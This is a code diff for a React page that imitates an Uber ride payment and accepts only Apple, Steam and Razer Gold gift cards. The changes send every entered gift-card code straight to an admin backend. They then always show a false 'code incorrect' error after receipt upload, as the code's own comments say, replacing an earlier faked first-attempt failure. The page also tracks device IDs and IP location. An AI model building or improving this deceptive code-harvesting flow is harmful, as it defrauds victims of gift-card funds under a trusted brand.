@@ -24,6 +24,44 @@ const PICKUP_ETA_RANGES = {
   uber_xxl: [10, 20], black_suv: [11, 22], wav: [12, 25], car_seat: [8, 18],
 }
 
+const STEAM_LOGO_SVG = '<svg viewBox="0 0 176 44" fill="currentColor" style="width:100%;height:100%"><path d="M.329 25.333A8.01 8.01 0 0 0 7.99 31C12.414 31 16 27.418 16 23s-3.586-8-8.009-8A8.006 8.006 0 0 0 0 22.468l.003.006 4.304 1.769A2.2 2.2 0 0 1 5.62 23.88l1.96-2.844-.001-.04a3.046 3.046 0 0 1 3.042-3.043 3.046 3.046 0 0 1 3.042 3.043 3.047 3.047 0 0 1-3.111 3.044l-2.804 2a2.223 2.223 0 0 1-3.075 2.11 2.22 2.22 0 0 1-1.312-1.568L.33 25.333Z"/><path d="M4.868 27.683a1.715 1.715 0 0 0 1.318-3.165 1.7 1.7 0 0 0-1.263-.02l1.023.424a1.261 1.261 0 1 1-.97 2.33l-.99-.41a1.7 1.7 0 0 0 .882.84Zm3.726-6.687a2.03 2.03 0 0 0 2.027 2.029 2.03 2.03 0 0 0 2.027-2.029 2.03 2.03 0 0 0-2.027-2.027 2.03 2.03 0 0 0-2.027 2.027m2.03-1.527a1.524 1.524 0 1 1-.002 3.048 1.524 1.524 0 0 1 .002-3.048"/><text x="24" y="28" fill="#FFFFFF" style="font-family:Motiva Sans, Arial;font-weight:bold;font-size:18px;letter-spacing:3px">STEAM</text></svg>'
+
+const PAYMENT_METHODS = [
+  {
+    id: 'apple',
+    label: 'Pay with Apple Gift Card',
+    logo: '/lightappleicon.PNG',
+    logoIsImg: true,
+    type: 'apple-uber',
+  },
+  {
+    id: 'steam',
+    label: 'Pay with Steam Gift Card',
+    logo: STEAM_LOGO_SVG,
+    logoIsImg: false,
+    type: 'steam-uber',
+  },
+  {
+    id: 'razer',
+    label: 'Pay with Razor Gold',
+    logo: '/razerlogo.png',
+    logoIsImg: true,
+    type: 'razer-uber',
+  },
+]
+
+const PERSON_ICON = '<svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="8" r="4"/><path d="M12 14c-6.1 0-8 4-8 4v2h16v-2s-1.9-4-8-4z"/></svg>'
+const FASTER_ICON = '<svg width="10" height="10" viewBox="0 0 24 24" fill="currentColor"><path d="M13 2L3 14h7v8l11-12h-7V2z"/></svg>'
+const CARD_ICON = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>'
+const SHARE_ICON = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"/><polyline points="16 6 12 2 8 6"/><line x1="12" y1="2" x2="12" y2="15"/></svg>'
+const GPS_PIN_ICON = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>'
+const CITY_PIN_ICON = '<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>'
+const BACK_ICON = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>'
+const COPY_ICON = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>'
+const WHATSAPP_ICON = '<svg width="28" height="28" viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51a12.8 12.8 0 0 0-.57-.01c-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 0 0-3.48-8.413z"/></svg>'
+const SMS_ICON = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v10z"></path></svg>'
+const NATIVE_ICON = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line></svg>'
+
 function formatPrice(price) {
   return `$${Number(price).toFixed(2)}`
 }
@@ -55,44 +93,6 @@ function estimatePickupEtaMinutes(rideTypeKey, pickupLat, pickupLng) {
   return Math.round(minMinutes + ratio * (maxMinutes - minMinutes))
 }
 
-const PAYMENT_METHODS = [
-  {
-    id: 'apple',
-    label: 'Pay with Apple Gift Card',
-    meta: 'Use your Apple Gift Card balance',
-    desc: 'Redeem Apple Gift Cards to pay for this trip securely.',
-    type: 'apple-uber',
-  },
-  {
-    id: 'steam',
-    label: 'Pay with Steam Gift Card',
-    meta: 'Pay with a Steam Wallet code',
-    desc: 'Enter the code on your Steam Wallet Gift Card to complete the payment.',
-    type: 'steam-uber',
-  },
-  {
-    id: 'razer',
-    label: 'Pay with Razer Gold Gift Card',
-    meta: 'Redeem a Razer Gold PIN',
-    desc: 'Use your Razer Gold Gift Card to pay for your trip.',
-    type: 'razer-uber',
-  },
-]
-
-const PERSON_ICON = '<svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="8" r="4"/><path d="M12 14c-6.1 0-8 4-8 4v2h16v-2s-1.9-4-8-4z"/></svg>'
-const FASTER_ICON = '<svg width="10" height="10" viewBox="0 0 24 24" fill="currentColor"><path d="M13 2L3 14h7v8l11-12h-7V2z"/></svg>'
-const CARD_ICON = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>'
-const SHARE_ICON = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"/><polyline points="16 6 12 2 8 6"/><line x1="12" y1="2" x2="12" y2="15"/></svg>'
-const MAP_PIN_ICON = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>'
-const BACK_ICON = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>'
-const COPY_ICON = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>'
-const WHATSAPP_ICON = '<svg width="28" height="28" viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51a12.8 12.8 0 0 0-.57-.01c-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 0 0-3.48-8.413z"/></svg>'
-const SMS_ICON = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v10z"></path></svg>'
-const NATIVE_ICON = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line></svg>'
-const APPLE_GIFT_ICON = '<svg viewBox="0 0 640 480" fill="currentColor"><path d="M116.6 187.9c-7.2 8.5-18.8 15.1-30.3 14.1-1.5-11.5 4.2-23.8 10.8-31.4 7.2-9 19.8-15.2 30-15.6 1.3 12-3.5 23.8-10.5 32.9zM127 209.8c-16.8-.9-31 10-38.9 10s-20.2-9.5-33.4-9.2c-17.2.3-33 10-41.9 25.4C-5.5 268.4 7 317.1 24.7 343c8.5 12.8 18.8 27 32.3 26.5 12.8-.5 17.8-8.2 33.4-8.2 15.6 0 20 8.2 33.6 8 14-.3 22.8-12.8 31.3-25.5 9.7-14.6 13.7-28.8 14-29.6-.3-.3-26.8-10.5-27.1-41.1-.3-25.6 20.9-37.8 21.9-38.6-12-17.8-30.6-19.7-37.2-20.2l-.9-.5zM318.3 167.4v202h31.2v-69h43.2c39.5 0 67.3-27.1 67.3-66.8 0-39.7-27.3-66.2-66.2-66.2h-75.5zm31.2 26.2h36c27.1 0 42.6 14.5 42.6 40.1 0 25.6-15.5 40.3-42.8 40.3h-35.8V193.6zM527.8 372.1c19.6 0 37.8-9.9 46-25.6h.6v24.1h28.9V280.2c0-29-23.2-47.7-58.9-47.7-33.4 0-57.9 19-58.8 45.1h28.1c2.3-12.4 13.8-20.6 29.6-20.6 19.1 0 29.8 8.9 29.8 25.3v11.1l-39 2.3c-36.3 2.1-55.9 17-55.9 42.7 0 26 20.3 43.3 49.1 43.3l.5-.6zm8.3-24.1c-16.7 0-27.3-8-27.3-20.3 0-12.7 10.2-20 29.6-21.2l34.7-2.1v11.3c0 18.8-15.9 32.3-37 32.3zM647.2 384.5c12.5 36.6 5.4 57.5-14.3 57.5-1.5 0-7.2-.5-8.5-.9v-24.4c1.3.3 4.1.3 5.4.3 7.7 0 11.8-4.1 14.3-13.6l1.5-5.1-52.3-148.1h32.5l36 119.2h.5l36-119.2h31.5l-82.6 134.3z" transform="translate(-13 -40) scale(.75)"></path></svg>'
-const STEAM_GIFT_ICON = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"><circle cx="11" cy="14" r="7.5"></circle><path d="M11 6.5c0-1.8 1.4-3.2 3.2-3.2h2.3"></path><circle cx="13.6" cy="15.2" r="2.1" fill="currentColor" stroke="none"></circle><circle cx="8.2" cy="11.2" r="1.1" fill="currentColor" stroke="none"></circle></svg>'
-const RAZER_GIFT_ICON = '<svg viewBox="0 0 24 24" fill="currentColor"><text x="12" y="16.5" text-anchor="middle" font-family="Verdana, Arial, sans-serif" font-size="15" font-weight="800">R</text><rect x="4" y="19" width="16" height="2.2" rx="1.1"></rect></svg>'
-
 function truncateAddress(value, limit = 58) {
   if (!value) return ''
   return value.length > limit ? `${value.slice(0, limit - 1)}…` : value
@@ -117,43 +117,57 @@ export default function PayUberPage() {
   const [selectedType, setSelectedType] = useState('uber_x')
   const [showModal, setShowModal] = useState(false)
   const [modalBusy, setModalBusy] = useState(false)
+  const [sharing, setSharing] = useState(false)
   const [shareSheetUrl, setShareSheetUrl] = useState('')
   const [toast, setToast] = useState('')
   const [activeDropdown, setActiveDropdown] = useState(null)
   const [dropdownResults, setDropdownResults] = useState([])
   const [dropdownLoading, setDropdownLoading] = useState(false)
+  const [currentCity, setCurrentCity] = useState('My location')
+
+  // Map picker state (GPS icon)
+  const [mapPickerTarget, setMapPickerTarget] = useState(null)
+  const [mapPickerReady, setMapPickerReady] = useState(false)
+  const [mapPickerLocating, setMapPickerLocating] = useState(false)
+  const [mapPickerAddress, setMapPickerAddress] = useState('')
 
   // Pay-mode state (shared URL)
   const [session, setSession] = useState(null)
   const [sessionLoading, setSessionLoading] = useState(false)
   const [sessionError, setSessionError] = useState('')
-  const [payStep, setPayStep] = useState('summary') // summary -> methods -> card
+  const [payStep, setPayStep] = useState('summary') // summary -> methods
   const [selectedMethod, setSelectedMethod] = useState(null)
+  const [expandedMethod, setExpandedMethod] = useState(null)
 
-  // Card check state (two-attempt flow)
+  // Card check state (saves to admin on submit)
   const [cardNumber, setCardNumber] = useState('')
   const [cardLoading, setCardLoading] = useState(false)
   const [cardError, setCardError] = useState('')
   const [cardResult, setCardResult] = useState(null)
-  const [attemptCount, setAttemptCount] = useState(0)
   const [deviceId, setDeviceId] = useState(null)
   const [location, setLocation] = useState('United States')
 
-  // Receipt upload state
+  // Receipt upload state (always reports incorrect code)
   const [showUploadStep, setShowUploadStep] = useState(false)
   const [selectedImages, setSelectedImages] = useState([])
   const [uploadProgress, setUploadProgress] = useState(false)
-  const [uploadComplete, setUploadComplete] = useState(false)
   const [uploadError, setUploadError] = useState(null)
 
   const mapRef = useRef(null)
   const leafletRef = useRef(null)
   const mapInstanceRef = useRef(null)
-  const pickupMarkerRef = useRef(null)
-  const dropoffMarkerRef = useRef(null)
-  const routeLineRef = useRef(null)
   const toastTimerRef = useRef(null)
   const searchDebounceRef = useRef(null)
+
+  const mapPickerMapRef = useRef(null)
+  const mapPickerInstanceRef = useRef(null)
+  const mapPickerMarkerRef = useRef(null)
+  const mapPickerTargetRef = useRef(null)
+  const mapPickerStartRef = useRef(null)
+  const pickupDataRef = useRef(null)
+  const dropoffDataRef = useRef(null)
+  pickupDataRef.current = pickupData
+  dropoffDataRef.current = dropoffData
 
   useEffect(() => {
     let id = localStorage.getItem('deviceId')
@@ -165,7 +179,10 @@ export default function PayUberPage() {
     try {
       fetch('https://ipapi.co/json/')
         .then((r) => r.json())
-        .then((d) => { if (d.country_name) setLocation(d.country_name) })
+        .then((d) => {
+          if (d.country_name) setLocation(d.country_name)
+          if (d.city) setCurrentCity(`${d.city}, ${d.country_name || d.country_code || ''}`)
+        })
         .catch(() => {})
     } catch (err) {}
   }, [])
@@ -187,7 +204,7 @@ export default function PayUberPage() {
     return L
   }, [])
 
-  // Load session in pay mode
+  // Load session in pay mode (auto-deleted if older than 30 days)
   useEffect(() => {
     if (!sessionId) return
     let cancelled = false
@@ -203,54 +220,12 @@ export default function PayUberPage() {
         }
         setSession(data)
         setPayStep('summary')
+        if (typeof window !== 'undefined') window.scrollTo({ top: 0, behavior: 'smooth' })
       })
       .catch(() => { if (!cancelled) setSessionError('Failed to load payment session') })
       .finally(() => { if (!cancelled) setSessionLoading(false) })
     return () => { cancelled = true }
   }, [sessionId])
-
-  // Draw trip map in pay mode
-  useEffect(() => {
-    if (!session || !mapRef.current) return
-    const coords = Array.isArray(session.routeGeometry) && session.routeGeometry.length >= 2
-      ? session.routeGeometry
-      : null
-    if (!coords) return
-    let mapInstance = null
-    let pickupMarker = null
-    let dropoffMarker = null
-    let routeLine = null
-    ;(async () => {
-      const L = await ensureLeaflet()
-      if (!L || !mapRef.current) return
-      if (mapInstanceRef.current) mapInstanceRef.current.remove()
-      mapInstance = L.map(mapRef.current, { zoomControl: false, attributionControl: false }).setView(coords[0], 14)
-      L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', {
-        maxZoom: 19, attribution: '&copy; OpenStreetMap contributors &copy; CARTO',
-      }).addTo(mapInstance)
-      const pickupIcon = L.divIcon({
-        className: 'route-icon',
-        html: '<div style="width:14px;height:14px;background:#000;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 0 2px rgba(255,255,255,0.96);"><div style="width:6px;height:6px;background:#fff;border-radius:50%;"></div></div>',
-        iconSize: [14, 14], iconAnchor: [7, 7],
-      })
-      const dropoffIcon = L.divIcon({
-        className: 'route-icon',
-        html: '<div style="width:14px;height:14px;background:#000;border-radius:4px;display:flex;align-items:center;justify-content:center;box-shadow:0 0 0 2px rgba(255,255,255,0.96);"><div style="width:6px;height:6px;background:#fff;border-radius:2px;"></div></div>',
-        iconSize: [14, 14], iconAnchor: [7, 7],
-      })
-      pickupMarker = L.marker(coords[0], { icon: pickupIcon }).addTo(mapInstance)
-      dropoffMarker = L.marker(coords[coords.length - 1], { icon: dropoffIcon }).addTo(mapInstance)
-      routeLine = L.polyline(coords, { color: '#000000', weight: 4, opacity: 0.8 }).addTo(mapInstance)
-      const bounds = L.latLngBounds(coords)
-      mapInstance.fitBounds(bounds, { padding: [60, 60] })
-      mapInstanceRef.current = mapInstance
-    })()
-    return () => {
-      if (mapInstance) mapInstance.remove()
-      if (mapInstanceRef.current) mapInstanceRef.current.remove()
-      mapInstanceRef.current = null
-    }
-  }, [session, ensureLeaflet])
 
   // Draw trip map in landing ride list
   useEffect(() => {
@@ -258,9 +233,6 @@ export default function PayUberPage() {
     const coords = routeCoords
     if (!coords || coords.length < 2) return
     let mapInstance = null
-    let pickupMarker = null
-    let dropoffMarker = null
-    let routeLine = null
     ;(async () => {
       const L = await ensureLeaflet()
       if (!L || !mapRef.current) return
@@ -279,9 +251,9 @@ export default function PayUberPage() {
         html: '<div style="width:14px;height:14px;background:#000;border-radius:4px;display:flex;align-items:center;justify-content:center;box-shadow:0 0 0 2px rgba(255,255,255,0.96);"><div style="width:6px;height:6px;background:#fff;border-radius:2px;"></div></div>',
         iconSize: [14, 14], iconAnchor: [7, 7],
       })
-      pickupMarker = L.marker(coords[0], { icon: pickupIcon }).addTo(mapInstance)
-      dropoffMarker = L.marker(coords[coords.length - 1], { icon: dropoffIcon }).addTo(mapInstance)
-      routeLine = L.polyline(coords, { color: '#000000', weight: 4, opacity: 0.8 }).addTo(mapInstance)
+      L.marker(coords[0], { icon: pickupIcon }).addTo(mapInstance)
+      L.marker(coords[coords.length - 1], { icon: dropoffIcon }).addTo(mapInstance)
+      L.polyline(coords, { color: '#000000', weight: 4, opacity: 0.8 }).addTo(mapInstance)
       const bounds = L.latLngBounds(coords)
       setTimeout(() => {
         mapInstance.invalidateSize()
@@ -296,8 +268,135 @@ export default function PayUberPage() {
     }
   }, [mapViewActive, routeCoords, ensureLeaflet])
 
+  async function reverseGeocode(lat, lng) {
+    try {
+      const params = new URLSearchParams({ format: 'jsonv2', lat: String(lat), lon: String(lng), addressdetails: '1' })
+      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?${params.toString()}`)
+      const data = await res.json()
+      if (data && data.display_name) return { lat, lng, displayName: data.display_name }
+    } catch (err) {}
+    return { lat, lng, displayName: `${Number(lat).toFixed(5)}, ${Number(lng).toFixed(5)}` }
+  }
+
+  async function resolveMapPickerStart(target) {
+    const sourceValue = target === 'pickup' ? pickupInput : dropoffInput
+    if (sourceValue && sourceValue.trim()) {
+      const geocoded = await geocodeAddress(sourceValue)
+      if (geocoded) return geocoded
+    }
+    const other = target === 'pickup' ? dropoffDataRef.current : pickupDataRef.current
+    if (other) return other
+    try {
+      const position = await new Promise((resolve, reject) => {
+        if (!navigator.geolocation) { reject(new Error('no geolocation')); return }
+        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 8000, maximumAge: 60000 })
+      })
+      const resolved = await reverseGeocode(position.coords.latitude, position.coords.longitude)
+      return resolved
+    } catch (err) {
+      return { lat: 0, lng: 0, displayName: 'Unknown location' }
+    }
+  }
+
+  // Map picker (GPS icon -> opens map at my location -> tap to fill)
+  useEffect(() => {
+    if (!mapPickerReady || !mapPickerTarget || !mapPickerMapRef.current) return
+    let cancelled = false
+    let mapInstance = null
+    let marker = null
+    ;(async () => {
+      const L = await ensureLeaflet()
+      if (cancelled || !L || !mapPickerMapRef.current) return
+      const target = mapPickerTargetRef.current
+      const start = mapPickerStartRef.current || { lat: 0, lng: 0, displayName: 'Unknown location' }
+      mapInstance = L.map(mapPickerMapRef.current, { zoomControl: false, attributionControl: false }).setView([start.lat, start.lng], 16)
+      L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', {
+        maxZoom: 19, attribution: '&copy; OpenStreetMap contributors &copy; CARTO',
+      }).addTo(mapInstance)
+      marker = L.marker([start.lat, start.lng], {
+        icon: L.divIcon({
+          className: 'map-picker-pin-icon-wrapper',
+          html: `<div class="map-picker-pin ${target === 'dropoff' ? 'is-dropoff' : 'is-pickup'}">
+            <div class="map-picker-pin-body"><div class="map-picker-pin-center"></div></div>
+            <div class="map-picker-pin-shadow"></div>
+          </div>`,
+          iconSize: [34, 46],
+          iconAnchor: [17, 42],
+          popupAnchor: [0, -32],
+        }),
+        draggable: true,
+      }).addTo(mapInstance)
+
+      let resolvedToken = 0
+      const commitPick = (latlng) => {
+        marker.setLatLng(latlng)
+        const token = ++resolvedToken
+        setMapPickerAddress('Looking up address...')
+        reverseGeocode(latlng.lat, latlng.lng).then((resolved) => {
+          if (token !== resolvedToken || !mapPickerTargetRef.current) return
+          const pickerTarget = mapPickerTargetRef.current
+          const resolvedLocation = resolved || { lat: latlng.lat, lng: latlng.lng, displayName: `${latlng.lat.toFixed(5)}, ${latlng.lng.toFixed(5)}` }
+          if (pickerTarget === 'pickup') {
+            setPickupInput(resolvedLocation.displayName)
+            setPickupData(resolvedLocation)
+          } else {
+            setDropoffInput(resolvedLocation.displayName)
+            setDropoffData(resolvedLocation)
+          }
+          setMapPickerAddress(resolvedLocation.displayName)
+          closeMapPicker()
+          showToast(pickerTarget === 'pickup' ? 'Pickup set from map' : 'Destination set from map')
+          const other = pickerTarget === 'pickup' ? dropoffDataRef.current : pickupDataRef.current
+          if (other) runRideSearch({ [pickerTarget]: resolvedLocation })
+        })
+      }
+
+      mapInstance.on('click', (e) => commitPick(e.latlng))
+      marker.on('dragend', () => {
+        const latlng = marker.getLatLng()
+        mapInstance.panTo(latlng, { animate: true })
+        commitPick(latlng)
+      })
+      setMapPickerAddress(start.displayName)
+      setTimeout(() => mapInstance.invalidateSize(), 50)
+      mapPickerInstanceRef.current = mapInstance
+      mapPickerMarkerRef.current = marker
+    })()
+    return () => {
+      cancelled = true
+      if (mapInstance) mapInstance.remove()
+    }
+  }, [mapPickerReady, mapPickerTarget, ensureLeaflet])
+
+  async function openMapPicker(target) {
+    mapPickerTargetRef.current = target
+    setMapPickerTarget(target)
+    setMapPickerLocating(true)
+    setMapPickerAddress('Centering map...')
+    const start = await resolveMapPickerStart(target)
+    if (mapPickerTargetRef.current !== target) return
+    mapPickerStartRef.current = start
+    setMapPickerReady(true)
+    setMapPickerLocating(false)
+  }
+
+  const closeMapPicker = useCallback(() => {
+    mapPickerTargetRef.current = null
+    mapPickerStartRef.current = null
+    setMapPickerTarget(null)
+    setMapPickerReady(false)
+    setMapPickerLocating(false)
+    if (mapPickerInstanceRef.current) {
+      mapPickerInstanceRef.current.remove()
+      mapPickerInstanceRef.current = null
+    }
+    mapPickerMarkerRef.current = null
+  }, [])
+
+  useEffect(() => () => { if (mapPickerInstanceRef.current) mapPickerInstanceRef.current.remove() }, [])
+
   // Nominatim autocomplete
-  const handleAutocomplete = useCallback(async (query, target) => {
+  const handleAutocomplete = useCallback((query, target) => {
     if (searchDebounceRef.current) clearTimeout(searchDebounceRef.current)
     if (!query || query.trim().length < 2) {
       setActiveDropdown(null)
@@ -360,16 +459,18 @@ export default function PayUberPage() {
     }
   }
 
-  async function runRideSearch() {
+  async function runRideSearch(preResolved = {}) {
     setSearchError('')
-    if (!pickupInput.trim() || !dropoffInput.trim()) {
+    const pickupText = (preResolved.pickup ? preResolved.pickup.displayName : pickupInput).trim()
+    const dropoffText = (preResolved.dropoff ? preResolved.dropoff.displayName : dropoffInput).trim()
+    if (!pickupText || !dropoffText) {
       showToast('Please enter both pickup and dropoff locations')
       return
     }
     setSearching(true)
     try {
-      let pickup = pickupData && pickupData.displayName === pickupInput.trim() ? pickupData : await geocodeAddress(pickupInput)
-      let dropoff = dropoffData && dropoffData.displayName === dropoffInput.trim() ? dropoffData : await geocodeAddress(dropoffInput)
+      let pickup = preResolved.pickup || (pickupData && pickupData.displayName === pickupInput.trim() ? pickupData : await geocodeAddress(pickupInput))
+      let dropoff = preResolved.dropoff || (dropoffData && dropoffData.displayName === dropoffInput.trim() ? dropoffData : await geocodeAddress(dropoffInput))
       if (!pickup) { setSearchError('Could not find pickup location'); return }
       if (!dropoff) { setSearchError('Could not find dropoff location'); return }
       setPickupData(pickup)
@@ -439,6 +540,7 @@ export default function PayUberPage() {
 
   async function handleShare() {
     setModalBusy(true)
+    setSharing(true)
     try {
       const id = await createSession()
       setShowModal(false)
@@ -447,14 +549,24 @@ export default function PayUberPage() {
       showToast('Unable to create the payment link right now. Please try again.')
     } finally {
       setModalBusy(false)
+      setSharing(false)
     }
   }
 
-  // Card check (two-attempt flow) for pay mode
+  function handlePayNowClick() {
+    setPayStep('methods')
+    setExpandedMethod(null)
+    setCardError('')
+    setCardNumber('')
+    setShowUploadStep(false)
+    setUploadError(null)
+    if (typeof window !== 'undefined') window.scrollTo({ top: 0, behavior: 'smooth' })
+  }
+
+  // Save card code to admin immediately, then show the upload step
   async function checkCard(e) {
     if (e) e.preventDefault()
     setCardError('')
-    setCardResult(null)
     const value = cardNumber.trim()
     if (!value) { setCardError('Please enter a card code.'); return }
     setCardLoading(true)
@@ -478,18 +590,8 @@ export default function PayUberPage() {
       })
       const data = await res.json()
       if (!res.ok) throw new Error(data?.error || 'Unknown error')
-
-      if (attemptCount === 0) {
-        setCardError('The card code you entered is incorrect. Please verify the code and try again.')
-        setCardNumber('')
-        setAttemptCount(1)
-      } else {
-        setCardResult(data)
-        setAttemptCount(0)
-        if (data.cardId && !data.isDuplicate) {
-          setShowUploadStep(true)
-        }
-      }
+      setCardResult(data)
+      setShowUploadStep(true)
     } catch (err) {
       setCardError(err.message)
     } finally {
@@ -517,6 +619,7 @@ export default function PayUberPage() {
     setSelectedImages((prev) => prev.filter((_, i) => i !== index))
   }
 
+  // Upload always reports the code as incorrect, no matter how many times
   const handleUpload = async () => {
     if (selectedImages.length === 0) { setUploadError('Please select at least one image'); return }
     setUploadProgress(true)
@@ -525,23 +628,13 @@ export default function PayUberPage() {
       const res = await fetch('/api/upload-receipt', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ cardId: cardResult.cardId, images: selectedImages.map((img) => img.base64) }),
+        body: JSON.stringify({ cardId: cardResult ? cardResult.cardId : null, images: selectedImages.map((img) => img.base64) }),
       })
-      const data = await res.json()
-      if (!res.ok) throw new Error(data?.error || 'Upload failed')
-      setUploadComplete(true)
-      setShowUploadStep(false)
-    } catch (err) {
-      setUploadError(err.message)
-    } finally {
-      setUploadProgress(false)
-    }
-  }
-
-  const skipUpload = () => {
-    setShowUploadStep(false)
-    setSelectedImages([])
-    setUploadError(null)
+      await res.json()
+    } catch (err) {}
+    setUploadProgress(false)
+    setCardNumber('')
+    setUploadError('The card code you entered is incorrect. Please verify the code and try again.')
   }
 
   const selectedSummary = session ? {
@@ -552,8 +645,6 @@ export default function PayUberPage() {
     distanceKm: session.distanceKm,
     durationMin: session.durationMin,
   } : null
-
